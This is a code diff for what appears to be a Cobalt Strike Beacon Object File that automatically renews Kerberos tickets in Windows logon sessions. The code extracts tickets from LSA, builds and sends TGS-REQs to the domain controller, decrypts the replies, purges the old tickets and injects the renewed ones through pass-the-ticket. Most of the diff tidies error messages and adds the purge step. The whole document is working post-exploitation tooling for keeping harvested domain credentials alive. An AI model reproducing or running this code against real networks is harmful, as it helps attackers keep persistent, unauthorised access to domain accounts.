@@ -55,7 +55,7 @@ VOID SendBytes(char* server, char* port, PBYTE content, int contentSize, PBYTE* 
     WSADATA wsaData;
     int iResult = WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (iResult != 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[x] Failed to start WSA Winsock: %d\n", iResult);
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to start WSA Winsock: %d\n", iResult);
         return;
     }
 
@@ -67,7 +67,7 @@ VOID SendBytes(char* server, char* port, PBYTE content, int contentSize, PBYTE* 
     struct addrinfo* result = NULL;
     iResult = WS2_32$getaddrinfo(server, port, &hints, &result);
     if (iResult != 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[x] Failed to get KDC IP info: %d\n", iResult);
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get KDC IP info: %d\n", iResult);
         WS2_32$WSACleanup();
         return;
     }
@@ -76,7 +76,7 @@ VOID SendBytes(char* server, char* port, PBYTE content, int contentSize, PBYTE* 
     for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {
         sock = WS2_32$socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
         if (sock == INVALID_SOCKET) {
-            BeaconPrintf(CALLBACK_ERROR, "[x] Failed to create socket: %ld\n", WS2_32$WSAGetLastError());
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create socket: %ld\n", WS2_32$WSAGetLastError());
             WS2_32$freeaddrinfo(result);
             WS2_32$WSACleanup();
             return;
@@ -92,7 +92,7 @@ VOID SendBytes(char* server, char* port, PBYTE content, int contentSize, PBYTE* 
     WS2_32$freeaddrinfo(result);
 
     if (sock == INVALID_SOCKET) {
-        BeaconPrintf(CALLBACK_ERROR, "[x] Failed to connect to KDC\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to connect to KDC.\n");
         WS2_32$WSACleanup();
         return;
     }
@@ -104,7 +104,7 @@ VOID SendBytes(char* server, char* port, PBYTE content, int contentSize, PBYTE* 
     WS2_32$send(sock, lenBuf, 4, 0);
     iResult = WS2_32$send(sock, (char*)content, contentSize, 0);
     if (iResult == SOCKET_ERROR) {
-        BeaconPrintf(CALLBACK_ERROR, "[x] Failed to send data: %d\n", WS2_32$WSAGetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to send data: %d\n", WS2_32$WSAGetLastError());
         WS2_32$closesocket(sock);
         WS2_32$WSACleanup();
         return;
@@ -114,7 +114,7 @@ VOID SendBytes(char* server, char* port, PBYTE content, int contentSize, PBYTE* 
     char sizeBuf[4];
     iResult = WS2_32$recv(sock, sizeBuf, 4, 0);
     if (iResult < 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[x] Failed to receive response size: %d\n", WS2_32$WSAGetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to receive response size: %d\n", WS2_32$WSAGetLastError());
         WS2_32$closesocket(sock);
         WS2_32$WSACleanup();
         return;
@@ -125,7 +125,7 @@ VOID SendBytes(char* server, char* port, PBYTE content, int contentSize, PBYTE* 
 
     *response = MemAlloc(*size);
     if (!*response) {
-        BeaconPrintf(CALLBACK_ERROR, "[x] Failed to allocate response buffer\n");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate response buffer\n");
         WS2_32$closesocket(sock);
         WS2_32$WSACleanup();
         return;
@@ -137,7 +137,7 @@ VOID SendBytes(char* server, char* port, PBYTE content, int contentSize, PBYTE* 
     while (received < *size) {
         iResult = WS2_32$recv(sock, (char*)buf, *size - received, 0);
         if (iResult <= 0) {
-            BeaconPrintf(CALLBACK_ERROR, "[x] Failed to receive response: %d\n", WS2_32$WSAGetLastError());
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to receive response: %d\n", WS2_32$WSAGetLastError());
             WS2_32$closesocket(sock);
             WS2_32$WSACleanup();
             return;
@@ -163,10 +163,7 @@ BOOL CreateTgsReq(char* cname, char* domain, char* sname, Ticket ticket, Encrypt
     req.req_body.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
     req.req_body.cname.name_count = 1;
     req.req_body.cname.name_string = MemAlloc(sizeof(void*));
-    if (!req.req_body.cname.name_string) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [1]: %lu\n", KERNEL32$GetLastError());
-        return FALSE; 
-    }
+    if (!req.req_body.cname.name_string) return FALSE;
     if (!MemCopy((unsigned char**)&req.req_body.cname.name_string[0], (unsigned char*)cname, MSVCRT$strlen(cname) + 1)) return FALSE;
     if (!MemCopy((unsigned char**)&req.req_body.realm, (unsigned char*)domain, MSVCRT$strlen(domain) + 1)) return FALSE;
     StrToUpper(req.req_body.realm); // Realm needs to be capitalized
@@ -175,20 +172,14 @@ BOOL CreateTgsReq(char* cname, char* domain, char* sname, Ticket ticket, Encrypt
     req.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
     req.req_body.sname.name_count = 2;
     req.req_body.sname.name_string = MemAlloc(2 * sizeof(void*));
-    if (!req.req_body.sname.name_string) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [2]: %lu\n", KERNEL32$GetLastError());
-        return FALSE;
-    }
+    if (!req.req_body.sname.name_string) return FALSE;
     if (!MemCopy((unsigned char**)&req.req_body.sname.name_string[0], (unsigned char*)sname, MSVCRT$strlen(sname) + 1)) return FALSE;
     if (!MemCopy((unsigned char**)&req.req_body.sname.name_string[1], (unsigned char*)domain, MSVCRT$strlen(domain) + 1)) return FALSE;
 
     // Set encryption types
     req.req_body.etypes_count = 4;
     req.req_body.etypes = MemAlloc(sizeof(int) * 4);
-    if (!req.req_body.etypes) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [3]: %lu\n", KERNEL32$GetLastError());
-        return FALSE;
-    }
+    if (!req.req_body.etypes) return FALSE;
     req.req_body.etypes[0] = aes256_cts_hmac_sha1;
     req.req_body.etypes[1] = aes128_cts_hmac_sha1;
     req.req_body.etypes[2] = rc4_hmac;
@@ -196,10 +187,7 @@ BOOL CreateTgsReq(char* cname, char* domain, char* sname, Ticket ticket, Encrypt
 
     // Create and set pre-authentication data
     AP_REQ* ap_req = MemAlloc(sizeof(AP_REQ));
-    if (!ap_req) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [4]: %lu\n", KERNEL32$GetLastError());
-        return FALSE;
-    }
+    if (!ap_req) return FALSE;
     ap_req->pvno = 5;
     ap_req->msg_type = KERB_AP_REQ;
     ap_req->ap_options = 0;
@@ -214,18 +202,12 @@ BOOL CreateTgsReq(char* cname, char* domain, char* sname, Ticket ticket, Encrypt
     ap_req->authenticator.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
     ap_req->authenticator.cname.name_count = 1;
     ap_req->authenticator.cname.name_string = MemAlloc(sizeof(void*));
-    if (!ap_req->authenticator.cname.name_string) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [5]: %lu\n", KERNEL32$GetLastError());
-        return FALSE;
-    }
+    if (!ap_req->authenticator.cname.name_string) return FALSE;
     if (!MemCopy((unsigned char**)&ap_req->authenticator.cname.name_string[0], (unsigned char*)cname, MSVCRT$strlen(cname) + 1)) return FALSE;
 
     req.pa_data_count = 1;
     req.pa_data = MemAlloc(sizeof(PA_DATA));
-    if (!req.pa_data) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [6]: %lu\n", KERNEL32$GetLastError());
-        return FALSE;
-    }
+    if (!req.pa_data) return FALSE;
     req.pa_data[0].type = PADATA_AP_REQ;
     req.pa_data[0].value = ap_req;
 
@@ -283,22 +265,15 @@ BOOL BuildTicket(TGS_REP* tgsRep, EncryptionKey sessionKey, BYTE** kirbiBytes, i
         tgsRep->enc_part.cipher_size, 
         &decrypted, 
         &decryptedSize
-    )){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to decrypt response.\n"); 
-        return FALSE;
-    }
+    )) return FALSE;
 
     AsnElt ae = { 0 };
-    if (!BytesToAsnDecode3(decrypted, decryptedSize, FALSE, &ae)){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to decode response.\n"); 
-        return FALSE; 
-    }
+    if (!BytesToAsnDecode3(decrypted, decryptedSize, FALSE, &ae))
+        return FALSE;
 
     EncKDCRepPart encRepPart = { 0 };
-    if (!AsnGetEncKDCRepPart(&(ae.sub[0]), &encRepPart)){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve enc_part.\n"); 
-        return FALSE; 
-    }
+    if (!AsnGetEncKDCRepPart(&(ae.sub[0]), &encRepPart))
+        return FALSE;
 
     // Build KRB-CRED
     KRB_CRED cred = { 0 };
@@ -306,10 +281,7 @@ BOOL BuildTicket(TGS_REP* tgsRep, EncryptionKey sessionKey, BYTE** kirbiBytes, i
     cred.msg_type = KERB_CRED_MSG;
     cred.ticket_count = 1;
     cred.tickets = MemAlloc(sizeof(Ticket));
-    if (!cred.tickets) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [1]: %lu\n", KERNEL32$GetLastError());
-        return FALSE;
-    }
+    if (!cred.tickets) return FALSE;
     cred.tickets[0] = tgsRep->ticket;
 
     KrbCredInfo info = { 0 };
@@ -322,10 +294,7 @@ BOOL BuildTicket(TGS_REP* tgsRep, EncryptionKey sessionKey, BYTE** kirbiBytes, i
     info.pname.name_type = tgsRep->cname.name_type;
     info.pname.name_count = tgsRep->cname.name_count;
     info.pname.name_string = MemAlloc(info.pname.name_count * sizeof(void*));
-    if (!info.pname.name_string) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [2]: %lu\n", KERNEL32$GetLastError());
-        return FALSE;
-    }
+    if (!info.pname.name_string) return FALSE;
     for (unsigned int i = 0; i < info.pname.name_count; i++)
         if (!MemCopy((unsigned char**)&info.pname.name_string[i], (unsigned char*)tgsRep->cname.name_string[i], MSVCRT$strlen(tgsRep->cname.name_string[i]) + 1)) return FALSE;
 
@@ -339,19 +308,13 @@ BOOL BuildTicket(TGS_REP* tgsRep, EncryptionKey sessionKey, BYTE** kirbiBytes, i
     info.sname.name_type = encRepPart.sname.name_type;
     info.sname.name_count = encRepPart.sname.name_count;
     info.sname.name_string = MemAlloc(info.sname.name_count * sizeof(void*));
-    if (!info.sname.name_string) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [3]: %lu\n", KERNEL32$GetLastError());
-        return FALSE;
-    }
+    if (!info.sname.name_string) return FALSE;
     for (unsigned int i = 0; i < info.sname.name_count; i++)
         if (!MemCopy((unsigned char**)&info.sname.name_string[i], (unsigned char*)encRepPart.sname.name_string[i], MSVCRT$strlen(encRepPart.sname.name_string[i]) + 1)) return FALSE;
 
     cred.enc_part.ticket_count = 1;
     cred.enc_part.ticket_info = MemAlloc(sizeof(KrbCredInfo));
-    if (!cred.enc_part.ticket_info) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory [4]: %lu\n", KERNEL32$GetLastError());
-        return FALSE;
-    }
+    if (!cred.enc_part.ticket_info) return FALSE;
     cred.enc_part.ticket_info[0] = info;
 
     // ASN.1 encode KRB-CRED 
@@ -375,86 +338,88 @@ VOID RenewTicket(HANDLE hLsa, ULONG authPackage, PTICKET_ENTRY ticket, char* dc)
         .MaximumLength = (USHORT)(MSVCRT$wcslen(wspn) * 2 + 2)
     };
 
-    if(!NT_SUCCESS(ExtractTicket(hLsa, authPackage, ticket->luid, target, &encodedTicket, &ticketSize))){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to extract ticket.\n"); 
-        return; 
+    if (!NT_SUCCESS(ExtractTicket(hLsa, authPackage, ticket->luid, target, &encodedTicket, &ticketSize))) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to extract ticket.\n");
+        return;
     }
 
-    AsnElt asnKrbCred = { 0 }; 
-    KRB_CRED kirbi = { 0 };  
+    AsnElt asnKrbCred = { 0 };
+    KRB_CRED kirbi = { 0 };
 
-    if (!BytesToAsnDecode3(encodedTicket, ticketSize, FALSE, &asnKrbCred)){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to decode ticket.\n"); 
-        return; 
-    }
-    
-    if (!AsnGetKrbCred(&(asnKrbCred.sub[0]), &kirbi)){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve KRB_CRED.\n"); 
-        return; 
-    }
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Building TGS-REQ for %s\\%s\n", kirbi.enc_part.ticket_info[0].prealm, kirbi.enc_part.ticket_info[0].pname.name_string[0]); 
-
-    // Create new TGS_REQ 
-    PBYTE tgsReqBytes = NULL; 
-    int tgsReqSize = 0; 
-
-    if(!CreateTgsReq(
-        kirbi.enc_part.ticket_info[0].pname.name_string[0],         // Username
-        kirbi.enc_part.ticket_info[0].prealm,                       // Domain
-        "krbtgt",                                                   // Target Service Name
-        kirbi.tickets[0],                                           // Ticket (used for preauthentication data)
-        kirbi.enc_part.ticket_info[0].key,                          // Client Key
-        &tgsReqBytes,                                               // Output buffer for TGS-REQ
-        &tgsReqSize                                                 // Length of TGS-REQ
-    )){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create TGS-REQ.\n"); 
-        return; 
+    if (!BytesToAsnDecode3(encodedTicket, ticketSize, FALSE, &asnKrbCred) ||
+        !AsnGetKrbCred(&(asnKrbCred.sub[0]), &kirbi)) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to decode ticket.\n");
+        return;
     }
 
-    // Send TGS_REQ to KDC 
-    PBYTE response = NULL; 
-    int responseSize = 0; 
-    SendBytes(dc, "88", tgsReqBytes, tgsReqSize, &response, &responseSize); 
-    if (responseSize <= 0){
-        BeaconPrintf(CALLBACK_ERROR, "[-] No response received.\n"); 
-        return; 
+    // Load crypto functions
+    if (!LoadCryptDll()) return;
+
+    // Create and send TGS-REQ
+    PBYTE tgsReqBytes = NULL;
+    int tgsReqSize = 0;
+
+    if (!CreateTgsReq(
+        kirbi.enc_part.ticket_info[0].pname.name_string[0],
+        kirbi.enc_part.ticket_info[0].prealm,
+        "krbtgt",
+        kirbi.tickets[0],
+        kirbi.enc_part.ticket_info[0].key,
+        &tgsReqBytes, &tgsReqSize
+    )) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create TGS-REQ.\n");
+        return;
     }
 
-    AsnElt asnResponse = { 0 }; 
-    if(!BytesToAsnDecode3(response, responseSize, FALSE, &asnResponse)){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to decode response.\n"); 
-        return; 
+    PBYTE response = NULL;
+    int responseSize = 0;
+    SendBytes(dc, "88", tgsReqBytes, tgsReqSize, &response, &responseSize);
+    if (responseSize <= 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] No response from %s:88.\n", dc);
+        return;
     }
 
-    if(asnResponse.tagValue != KERB_TGS_REP){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Response is not a TGS-REP.\n"); 
-        return; 
+    // Parse TGS-REP
+    AsnElt asnResponse = { 0 };
+    if (!BytesToAsnDecode3(response, responseSize, FALSE, &asnResponse) || asnResponse.tagValue != KERB_TGS_REP) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid TGS-REP.\n");
+        return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] TGT renewal requested\n"); 
 
-    // Parse and decode TGS_REP 
-    TGS_REP tgsRep = { 0 }; 
-    if(!ParseTgsRep(asnResponse, &tgsRep)){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse TGS-REP.\n"); 
-        return; 
+    TGS_REP tgsRep = { 0 };
+    if (!ParseTgsRep(asnResponse, &tgsRep)) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse TGS-REP.\n");
+        return;
     }
 
     PBYTE kirbiBytes = NULL;
     int kirbiSize = 0;
     EncKDCRepPart encRepPart = { 0 };
-    
-    if(!BuildTicket(&tgsRep, kirbi.enc_part.ticket_info[0].key, &kirbiBytes, &kirbiSize, &encRepPart)){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed build ticket.\n");
+
+    if (!BuildTicket(&tgsRep, kirbi.enc_part.ticket_info[0].key, &kirbiBytes, &kirbiSize, &encRepPart)) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build renewed ticket.\n");
         return;
     }
 
-    // Inject ticket into current logon session (PTT)
+    // Purge old ticket from cache
+    KERB_PURGE_TKT_CACHE_REQUEST purgeRequest = { 0 };
+    purgeRequest.MessageType = KerbPurgeTicketCacheMessage;
+    purgeRequest.LogonId = ticket->luid;
+    purgeRequest.ServerName.Buffer = wspn;
+    purgeRequest.ServerName.Length = (USHORT)(MSVCRT$wcslen(wspn) * 2);
+    purgeRequest.ServerName.MaximumLength = (USHORT)(MSVCRT$wcslen(wspn) * 2 + 2);
+
+    PVOID purgeResponse = NULL;
+    ULONG purgeResponseSize = 0;
+    NTSTATUS purgeProtoStatus = 0;
+    SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &purgeRequest, sizeof(purgeRequest), &purgeResponse, &purgeResponseSize, &purgeProtoStatus);
+    if (purgeResponse)
+        SECUR32$LsaFreeReturnBuffer(purgeResponse);
+
+    // Import renewed ticket (PTT)
     ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + kirbiSize;
     PKERB_SUBMIT_TKT_REQUEST submitRequest = (PKERB_SUBMIT_TKT_REQUEST)MemAlloc(submitSize);
-    if (!submitRequest) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for PTT: %lu\n", KERNEL32$GetLastError());
-        return;
-    }
+    if (!submitRequest) return;
 
     submitRequest->MessageType = KerbSubmitTicketMessage;
     submitRequest->KerbCredSize = kirbiSize;
@@ -462,16 +427,15 @@ VOID RenewTicket(HANDLE hLsa, ULONG authPackage, PTICKET_ENTRY ticket, char* dc)
     submitRequest->LogonId = ticket->luid;
     MSVCRT$memcpy((PBYTE)submitRequest + submitRequest->KerbCredOffset, kirbiBytes, kirbiSize);
 
-    NTSTATUS pttStatus = 0;
-    NTSTATUS pttProtoStatus = 0;
-    ULONG pttResponseSize = 0;
     PVOID pttResponse = NULL;
-    pttStatus = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &pttResponse, &pttResponseSize, &pttProtoStatus);
+    ULONG pttResponseSize = 0;
+    NTSTATUS pttProtoStatus = 0;
+    NTSTATUS pttStatus = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &pttResponse, &pttResponseSize, &pttProtoStatus);
     MemFree(submitRequest);
 
     if (!NT_SUCCESS(pttStatus) || !NT_SUCCESS(pttProtoStatus)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to import ticket (0x%08x / 0x%08x).\n", pttStatus, pttProtoStatus);
-        if (pttResponse) 
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to import ticket (0x%08x / 0x%08x)\n", pttStatus, pttProtoStatus);
+        if (pttResponse)
             SECUR32$LsaFreeReturnBuffer(pttResponse);
         return;
     }
@@ -524,7 +488,7 @@ VOID go(char* args, int argc) {
 
     GetDomainController(&dc); 
     if(!dc){
-        BeaconPrintf(CALLBACK_ERROR, "[-] Could not find domain controller.\n", dc);
+        BeaconPrintf(CALLBACK_ERROR, "[-] Could not find domain controller.\n");
         return; 
     }
     
@@ -532,6 +496,7 @@ VOID go(char* args, int argc) {
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Domain Controller : %s\n", dc);
     if (targetUsers && targetUsers[0] != '\0')
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Target users      : %s\n", targetUsers);
+    BeaconPrintf(CALLBACK_OUTPUT, "\n"); 
     BeaconWakeup();
 
     do {
@@ -547,8 +512,8 @@ VOID go(char* args, int argc) {
                 if (Expires(ticket, threshold)) {
                     LARGE_INTEGER now = { 0 };
                     NTDLL$NtQuerySystemTime(&now);
-                    LONGLONG lifetime = (ticket->endTime.QuadPart - now.QuadPart) / 600000000LL;
-                    BeaconPrintf(CALLBACK_OUTPUT, "[*] Remaining ticket lifetime below threshold (%lld/%dmin)\n", lifetime, threshold);
+                    LONGLONG remaining = (ticket->endTime.QuadPart - now.QuadPart) / 600000000LL;
+                    BeaconPrintf(CALLBACK_OUTPUT, "[*] Remaining ticket lifetime below threshold (%lld/%dmin).", remaining, threshold);
                     RenewTicket(hLsa, authPackage, ticket, dc);
                 }
             }
